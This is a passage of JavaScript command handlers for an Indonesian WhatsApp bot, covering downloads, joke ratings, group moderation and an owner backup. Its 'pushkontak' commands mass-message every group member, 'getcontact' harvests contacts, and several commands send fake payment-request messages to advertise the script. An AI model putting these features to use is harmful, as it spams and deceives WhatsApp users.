case 'ig':{
if (!text) throw `Example : ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`
await loading ()
reply(mess.search)
let iganu = await igdl2(text)
zynX.sendMessage(m.chat, { video: { url: iganu[0].url }, caption: mess.success })
}
break

case 'carbon':{
if (!text) return reply(`Example : ${prefix + command} textnya`)
reply(mess.wait)
let res = await fetch(`https://aemt.me/carbon?text=${text}`)
let carbon = await res.json()
let cap = `${mess.success}`
zynX.sendMessage(from, {image: { url: carbon.result },caption: cap},{ quoted:m })
}
break

case 'sc':
case 'script': {
    function generateReferenceId(length = 11) {
        return crypto.randomBytes(length).toString('hex').toUpperCase().slice(0, length);
    }

    let caption = `Tertarik? https://t.me/Zynxzooo\n`;
    const referenceId = generateReferenceId();

    let msg = await generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: caption,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: wm,
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            ...(await prepareWAMessageMedia(
                                { image: { url: `http://telegra.ph/file/d3993006a1431ef2aa9b9.jpg` } },
                                { upload: zynX.waUploadToServer },
                            )),
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "review_and_pay",
                                "buttonParamsJson": `{
                                    "currency": "IDR",
                                    "payment_configuration": "",
                                    "payment_type": "",
                                    "total_amount": {
                                        "value": 3000661,
                                        "offset": 100
                                    },
                                    "reference_id": "${referenceId}",
                                    "type": "physical-goods",
                                    "order": {
                                        "status": "payment_requested",
                                        "description": "",
                                        "subtotal": {
                                            "value": 5000000,
                                            "offset": 100
                                        },
                                        "tax": {
                                            "value": 661,
                                            "offset": 100
                                        },
                                        "discount": {
                                            "value": 2000000,
                                            "offset": 100
                                        },
                                        "order_type": "ORDER",
                                        "items": [
                                            {
                                                "retailer_id": "7537631592926009",
                                                "product_id": "7538731592926009",
                                                "name": "${botname}",
                                                "amount": {
                                                    "value": 450510,
                                                    "offset": 1000
                                                },
                                                "quantity": ${totalFitur()}
                                            }
                                        ]
                                    },
                                    "additional_note": "━──────────────────────━\n\n- Button\n- No Enc\n- Free Apikey\n- Free Update SC Forever\n\n━──────────────────────━",
                                    "native_payment_methods": []
                                }`
                            }],
                        }),
                        contextInfo: {
                            stanzaId: m.key.id,
                            remoteJid: m.isGroup ? m.sender : m.key.remoteJid,
                            participant: m.key.participant || m.sender,
                            fromMe: m.key.fromMe,
                            quotedMessage: m.message,
                        },
                    }),
                },
            },
        },
        {},
    );

   if (!m.isGroup) return zynX.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,
    });
    
   if (m.isGroup) return zynX.relayMessage(m.chat, {
        "requestPaymentMessage": {
            amount: {
                value: 30006610,
                offset: 100,
                currencyCode: 'IDR'
            },
            amount1000: 30006610,
            background: null,
            currencyCodeIso4217: 'IDR',
            expiryTimestamp: 1000000,
            noteMessage: {
                extendedTextMessage: {
                    text: '━────────────────────━\n\n- Button\n- No Enc\n- Free Apikey\n- Free Update SC Forever\n\n━────────────────────━',
                }
            },
            requestFrom: m.sender
        }
    }, {});
}
break
/*
case 'testsc': {
    function generateReferenceId(length = 11) {
        return crypto.randomBytes(length).toString('hex').toUpperCase().slice(0, length);
    }

    let cup = `*('My Contact 👤')*
_• https://tinyurl.com/whtssapppp_
_• t.me/lyossh_
`;
    const referenceId = generateReferenceId();
    let msg = await generateWAMessageFromContent(
        m.chat,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: cup,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: `Zʏɴxᴢᴏ`,
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            ...(await prepareWAMessageMedia(
                                { image: { url: `http://telegra.ph/file/d3993006a1431ef2aa9b9.jpg` } },
                                { upload: zynX.waUploadToServer },
                            )),
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                name: 'review_and_pay',
                                buttonParamsJson: JSON.stringify({
                                    currency: "IDR",
                                    total_amount: { value: 5000000, offset: 100 },
                                    amount_discount: { value: 300000, offset: 100 },
                                    reference_id: referenceId,
                                    type: "physical-goods",
                                    order: {
                                        status: "payment_requested",
                                        subtotal: { value: 0, offset: 100 },
                                        order_type: "PAYMENT_REQUEST",
                                        items: [
                                        {
                                            retailer_id: 7537631592926009,
                                            product_id: 7538731592926009,
                                            name: botname,
                                            amount: {
                                                value: 9999900,
                                                offset: 100
                                            },
                                            quantity: 999999
                                        },
                                        {
                                            retailer_id: "custom-item-24789f2d-41dc-4a76-88e5-1e178e933db6",
                                            name: "Zʏɴxᴢᴏ",
                                            amount: { value: 4500000, offset: 100 },
                                            quantity: 1
                                        }]
                                    },
                                    additional_note: "LIST INFO SCRIPT🪽\n\n • HD VIDEO\n • SCRAPE\n • PAIRING\n • BUTTON\n • ANTI MALING\n • JAGA GRUB\n • FREE UPDATE SC\nAMPEK SC MATI",
                                    native_payment_methods: []
                                })
                            }],
                        }),
                        contextInfo: {
                            stanzaId: m.key.id,
                            remoteJid: m.isGroup ? m.sender : m.key.remoteJid,
                            participant: m.key.participant || m.sender,
                            fromMe: m.key.fromMe,
                            quotedMessage: m.message,
                        },
                    }),
                },
            },
        },
        {},
    );

    return zynX.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id,
    });
}
break*/

case 'afk': {
if (isBan) return reply(mess.bann)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
reply(`Yahh, Kak *${pushname}*... Telah Afk\n\n ❏  *Alasan* ${text ? ': ' + text : ''}`)
}
break

case 'limit':{
reply('*Your Limit:* ' + (db.data.users[m.sender].limit))
}
break

case 'owner': case 'creator':{
  const p = `${global.owner}`;
  let pp = await zynX.profilePictureUrl(`${p}@s.whatsapp.net`, 'image').catch((_) => "https://telegra.ph/file/1ecdb5a0aee62ef17d7fc.jpg");
  let owner = `wa.me/${p}`;
  let vcard = `
BEGIN:VCARD
VERSION:3.0
N:WhatsApp; Zʏɴxᴢᴏ
ORG: ${global.ownername}
TITLE:soft
item1.TEL;waid=${global.owner}:${global.owner}
item1.X-ABLabel:Contact Owner
item2.TEL;waid=${global.bottz}:${global.bottz}
item2.X-ABLabel:Contact Bot
item3.URL:https://t.me/Zynxzooo
item3.X-ABLabel:💬 More
item4.EMAIL;type=INTERNET:${global.ownermail}
item4.X-ABLabel:Email
item5.ADR:;;🇮🇩 Indonesia;;;;
item5.X-ABADR:💬 More
END:VCARD`;
  const sentMsg = await zynX.sendMessage(m.chat, {
    contacts: {
      displayName: ownername,
      contacts: [{ vcard }]
    },
    contextInfo: {
      externalAdReply: {
        title: `Zʏɴxᴢᴏ ${versions}`,
        body: ownername,
        thumbnailUrl: pp,
        sourceUrl: null,
        mediaType: 1,
        showAdAttribution: true,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: m });

zynX.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku.`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: sentMsg })
}
break

        case "getsw": {
          if (m.quoted?.chat != "status@broadcast")
            return reply(`Reply Status WhatsApp !`);
          let buffer = await m.quoted.download();
          await zynX.sendFile(
            m.chat,
            buffer,
            "",
            m.quoted.text || "",
            null,
            false,
            { quoted: m },
          ).catch((_) => reply(m.quoted.text || ""));
        }
        break;

case 'runtime': {
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
rin = `*Runtime :* _${runtime(process.uptime())}_\n*Response Speed :* _${latensi.toFixed(4)} Second_\n*Ram :* _${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}_`
await zynX.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ctext(rin),
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
}
break

case 'totalfitur': {
reply(`${totalFitur()} Features`)
}
break

case 'listcase': {
let { listCase } = require('./lib/scrapelistCase.js')
reply(listCase())
}
break

case 'apakah': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
reply(mess.wait)
await sleep(500)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${kah}`)
}
break
case 'bisakah': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya menjadi presiden`)
reply(mess.wait)
await sleep(500)
const bisa = ['Bisa', 'Gak Bisa', 'Gak Bisa Ajg Aaokawpk', 'TENTU PASTI KAMU BISA!!!!']
const ga = bisa[Math.floor(Math.random() * bisa.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ga}`)
}
break
case 'bagaimanakah': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} cara mengatasi sakit hati`)
reply(mess.wait)
await sleep(500)
const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', 'Pusing ah', 'Owhh Begitu:(', 'Gimana yeee']
const ya = gimana[Math.floor(Math.random() * gimana.length)]
reply(`Pertanyaan : Apakah ${q}\nJawaban : ${ya}`)
}
break
case 'rate': {
if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
reply(mess.wait)
await sleep(500)
const ra = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const te = ra[Math.floor(Math.random() * ra.length)]
reply(`Rate : ${q}\nJawaban : *${te}%*`)
}
break
case 'gantengcek': case 'cekganteng': {
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Zʏɴxᴢᴏ`)
reply(mess.wait)
await sleep(500)
const gan = ['10% banyak" perawatan ya bang:v\nCanda Perawatan:v','30% Semangat bang Merawat Dirinya><','20% Semangat Ya bang👍','40% Wahh bang><','50% abang Ganteng deh><','60% Hai Ganteng🐊','70% Hai Ganteng🐊','62% Bang Ganteng><','74% abang ni ganteng deh><','83% Love You abang><','97% Assalamualaikum Ganteng🐊','100% Bang Pake Susuk ya??:v','29% Semangat Bang:)','94% Hai Ganteng><','75% Hai Bang Ganteng','82% wihh abang Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const teng = gan[Math.floor(Math.random() * gan.length)]
reply(`Nama : ${q}\nJawaban : *${teng}*`)
}
break           
case 'cantikcek': case 'cekcantik': {
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
reply(mess.wait)
await sleep(500)
const can = ['10% banyak" perawatan ya kak:v\nCanda Perawatan:v','30% Semangat Kaka Merawat Dirinya><','20% Semangat Ya Kaka👍','40% Wahh Kaka><','50% kaka cantik deh><','60% Hai Cantik🐊','70% Hai Ukhty🐊','62% Kakak Cantik><','74% Kakak ni cantik deh><','83% Love You Kakak><','97% Assalamualaikum Ukhty🐊','100% Kakak Pake Susuk ya??:v','29% Semangat Kakak:)','94% Hai Cantik><','75% Hai Kakak Cantik','82% wihh Kakak Pasti Sering Perawatan kan??','41% Semangat:)','39% Lebih Semangat🐊']
const tik = can[Math.floor(Math.random() * can.length)]
reply(`Nama : ${q}\nJawaban : *${tik}*`)
}
break
case 'sangecek': case 'ceksange': case 'gaycek': case 'cekgay': case 'lesbicek': case 'ceklesbi': {
if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Lisaa`)
reply(mess.wait)
await sleep(500)
const sangeh = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', '100']
const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
reply(`Nama : ${q}\nJawaban : *${sange}%*`)
}
break
case 'kapankah': {
if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
reply(mess.wait)
await sleep(500)
const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', '30 Hari Lagi', '35 Hari Lagi', '40 Hari Lagi', '45 Hari Lagi', '50 Hari Lagi', '55 Hari Lagi', '60 Hari Lagi', '65 Hari Lagi', '70 Hari Lagi', '75 Hari Lagi', '80 Hari Lagi', '85 Hari Lagi', '90 Hari Lagi', '95 Hari Lagi', '100 Hari Lagi', '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', '20 Bulan Lagi', '25 Bulan Lagi', '30 Bulan Lagi', '35 Bulan Lagi', '40 Bulan Lagi', '45 Bulan Lagi', '50 Bulan Lagi', '55 Bulan Lagi', '60 Bulan Lagi', '65 Bulan Lagi', '70 Bulan Lagi', '75 Bulan Lagi', '80 Bulan Lagi', '85 Bulan Lagi', '90 Bulan Lagi', '95 Bulan Lagi', '100 Bulan Lagi', '1 Tahun Lagi', '2 Tahun Lagi', '3 Tahun Lagi', '4 Tahun Lagi', '5 Tahun Lagi', 'Besok', 'Lusa', `Abis Command Ini Juga Lu ${q}`]
const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
reply(`Pertanyaan : ${q}\nJawaban : *${kapankah}*`)
}
break

case 'getcontact': case 'getcon': {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return reply(mess.admin)
konstak = await zynX.sendMessage(m.chat, {
    text: `Group : *${groupMetadata.subject}*\nMember : *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
zynX.sendContact(m.chat, participants.map(a => a.id), konstak)
}
break
case 'totag': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(`Ehh Bot Nya Belum Jadi Admin ☝️😅`)
if (!isAdmins) return reply(mess.admin)
if (!m.quoted) return `Reply pesan dengan caption ${prefix + command}`
zynX.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
}
break

case 'linkgroup': case 'linkgc': {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
let response = await zynX.groupInviteCode(from)
zynX.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
await loading()
zynX.groupRevokeInvite(from)
break

case 'sendlinkgc': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628123xxxxxx`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await zynX.groupInviteCode(from)
zynX.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })

}
break
case 'kick': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zynX.groupParticipantsUpdate(from, [users], 'remove')
reply(mess.done)
}
break
case 'add': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zynX.groupParticipantsUpdate(from, [users], 'add')
reply(mess.done)
}
break
case 'promote': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zynX.groupParticipantsUpdate(from, [users], 'promote')
reply(mess.done)
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.badm)
if (!isAdmins) return reply(mess.admin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await zynX.groupParticipantsUpdate(from, [users], 'demote')
reply(mess.done)
}
break
case "h":
case "hidetag": {
if (!m.isGroup) return reply(mess.group);
if (!isAdmins && !isCreator) return reply(mess.admin);
let tek = m.quoted ? quoted.text : text ? text : "";
zynX.sendMessage(
m.chat, {
text: tek,
mentions: participants.map((a) => a.id),
}, {quoted: zynz}
);
}
break
case 'tagall': {
if (!isAdmins) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.badm)
if (!m.isGroup) return
await loading()
let teks = `══〘 *👥 Tag All* 〙══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
zynX.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:fcall })
}
break

case 'delsampah':
{
 if (!isCreator) return reply(mess.owner);
 reply(mess.wait);
 let directoryPath = './'; // Ganti dengan path yang sesuai di dalam kontainer
 fs.readdir(directoryPath, async function (err, files) {
 if (err) {
 return reply('Tidak dapat memindai direktori: ' + err);
 } 
 let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")|| item.endsWith("zip")|| item.endsWith("tar.gz"));
 var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`;
 if (filteredArray.length == 0) return reply(teks);
 for (let i = 0; i < filteredArray.length; i++) {
 console.log("Nama file:", filteredArray[i]); // Tambahkan log untuk memeriksa nama file
 let stats = fs.statSync(path.join(directoryPath, filteredArray[i]));
 console.log("Stats:", stats); // Tambahkan log untuk memeriksa informasi stats
 let fileSizeInBytes = stats.size;
 let fileSize;
 if (fileSizeInBytes < 1024) {
 fileSize = `${fileSizeInBytes} Bytes`;
 } else if (fileSizeInBytes < 1024 * 1024) {
 fileSize = `${(fileSizeInBytes / 1024).toFixed(2)} KB`;
 } else if (fileSizeInBytes < 1024 * 1024 * 1024) {
 fileSize = `${(fileSizeInBytes / (1024 * 1024)).toFixed(2)} MB`;
 } else {
 fileSize = `${(fileSizeInBytes / (1024 * 1024 * 1024)).toFixed(2)} GB`;
 }
 teks += `${i+1}. ${filteredArray[i]} - ${fileSize}\n`;
 }
 reply(teks);
 await sleep(2000);
 reply("Menghapus file sampah...");
 await Promise.all(filteredArray.map(async function (file) {
 try {
 await fs.unlinkSync(path.join(directoryPath, file));
 } catch (err) {
 console.error(err);
 }
 }));
 await sleep(2000);
 reply("Berhasil menghapus semua sampah");
 });
}
break

case 'resetlimit': {
if (!isCreator) return reply(mess.owner)
let list = Object.entries(global.db.data.users)
	let lim = !args || !args[0] ? 100 : isNumber(args[0]) ? parseInt(args[0]) : 100
	lim = Math.max(1, lim)
	list.map(([user, data], i) => (Number(data.limit = lim)))
		zynX.sendMessage(m.chat, {text: `*Limit berhasil direset ${lim} / user*`}, { quoted: m })
		}
break

case 'addlimit': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply('Masukkan Jumlah Limit Yang Akan Diberi')
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    if (!who) throw reply('Tag Orangnya')
    let txt = text.replace('@' + who.split`@`[0], '').trim()
    if (isNaN(txt)) throw reply('Hanya Angka')
    let poin = parseInt(txt)
    let limit = poin
    if (limit < 1) throw reply('Minimal 1')
    let user = global.db.data.users
    user[who].limit += poin
    if (limit > 9999999) return reply('Jangan Banyak² Jir 😂') 
    zynX.sendMessage(m.chat, {text: `Selamat @${who.split`@`[0]}. Kamu Mendapatkan +${poin} Limit!`}, {quoted:m})
    }
break

case 'pushkontak2':{
if (!isCreator) return reply(mess.owner)
let idgc = text.split("|")[0]
let pesan = text.split("|")[1]
if (!idgc && !pesan) return reply(`Example: ${prefix + command} idgc|pesan`)
let metaDATA = await zynX.groupMetadata(idgc).catch((e) => reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
let count = getDATA.length;
let sentCount = 0;
reply(`*_Sedang Push ID..._*\n*_Mengirim pesan ke ${getDATA.length} orang, waktu selesai ${getDATA.length * 3} detik_*`)
for (let i = 0; i < getDATA.length; i++) {
setTimeout(function() {
zynX.sendMessage(getDATA[i], { text: pesan });
count--;
sentCount++;
if (count === 0) {
reply(`*_Semua pesan telah dikirim!:_* *_✓_*\n*_Jumlah pesan terkirim:_* *_${sentCount}_*`);
}
}, i * 3000);
}
}
break

case 'pushkontak':{
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(`di group coy`)
if (!text) return reply(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let geek of mem) {
await sleep(3000)
zynX.sendMessage(geek, {text: `${teksnye}`}, {quoted:fcall})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break

case 'getidgc':
if (!m.isGroup) return reply('kusus Group')
ewe = `${m.chat}`
await zynX.relayMessage(m.chat,  {
requestPaymentMessage: {
currencyCodeIso4217: 'IDR',
amount1000: 1000000000,
requestFrom: m.sender,
noteMessage: {
extendedTextMessage: {
text: ewe,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
}}}}}}, {})
break

case 'join': {
if (!isCreator) return reply(mess.owner)
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
await zynX.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break

case "cekidgc": {
if (!isCreator) return reply(mess.premium)
let getGroups = await zynX.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST GROUP DI BAWAH*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await zynX.groupMetadata(x)
teks += `◉ Nama : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `Untuk Penggunaan Silahkan Ketik Command ${prefix}pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas`)
}
break

case 'addgc':

    if (!m.isGroup) return reply(mess.group)         

if (!isCreator) return reply(`khusus Creator`)

ntilink.push(m.chat)
        fs.writeFileSync('./database/idgroup.json', JSON.stringify(ntilink))

reply(`${command} sukses`)

           break
case 'editgroup': 
case 'autogc': {
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
if (args[0] === 'disable'){
await zynX.groupSettingUpdate(from, 'announcement').then((res) => reply(`Sukses Menutup Group`)).catch((err) => reply(jsonformat(err)))
} else if (args[0] === 'enable'){
await zynX.groupSettingUpdate(from, 'not_announcement').then((res) => reply(`Sukses Membuka Group`)).catch((err) => reply(jsonformat(err)))
} else {
zynX.sendMessage(m.chat, { image: ppnyauser, caption: ` Silahkan Ketik
Group Open
Group Close`}, {quoted:m}) 
 }
}
break
case 'gc': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: wm
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ctext(`click button *enable* to enable gc\nclick button *disable* to disable gc`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".autogc enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".autogc disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await zynX.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'ntilink': {
if (!m.isGroup) return reply('Buat Di Group Bodoh')
if (!isBotAdmins) return reply('Bot Bukan Admin Cuy')
if (!isAdmins) return reply('Lah Dikira Admin Group Kali')
await loading()
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "enable") {
if (AntiLink) return m.reply('Sudah Aktif')
ntilink.push(from)
m.reply('🚩 Succes menyalakan antilink di group ini ')
} else if (args[0] === "disable") {
if (!AntiLink) return m.reply('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
m.reply('🚩 Succes mematikan antilink di group ini ')
} else {
m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
break
case 'antilink': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: wm
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ctext(`click button *enable* to enable antilink\nclick button *disable* to disable antilink`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".ntilink enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".ntilink disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await zynX.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "wlcm": {
if (!isCreator && !isAdmins) return reply(mess.owner)
if (!m.isGroup) return reply('Buat Di Group Bodoh')
await loading()
if (args.length < 1) return reply('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "enable") {
if (welcm) return reply('Sudah Aktif')
wlcm.push(from)
var groupe = await zynX.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
zynX.sendMessage(from, {text: `Fitur Welcome Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "disable") {
if (!welcm) return reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
reply('Sukses Mematikan Welcome  di group ini')
}
}
break
case 'welcome': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: wm
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: ctext(`click button *enable* to enable welcome\nclick button *disable* to disable welcome`),
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".wlcm enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".wlcm disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await zynX.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break          
           
case 'delgc':

  if (!isCreator) return reply(`khusus Creator`)

    if (!m.isGroup) return reply(mess.group)

var ini = ntilink.indexOf(m.chat)

ntilink.splice(ini, 1)

fs.writeFileSync('./database/idgruop.json', JSON.stringify(ntilink))

reply(`${command} sukses`)

break

case 'backup':
        {
          if (!isCreator) return reply(mess.owner)
     await reply("Sabar Mas Lagi Backup!!!");
          const { execSync } = require("child_process");
          const ls = (await execSync("ls"))
            .toString()
            .split("\n")
            .filter(
              (pe) =>
                pe != "node_modules" &&
                pe != "package-lock.json" &&
                pe != "yarn.lock" &&
                pe != ""
            );
          const exec = await execSync(`zip -r ZʏɴxᴢᴏxXI.zip ${ls.join(" ")}`);
          await zynX.sendMessage(
            m.chat,
            {
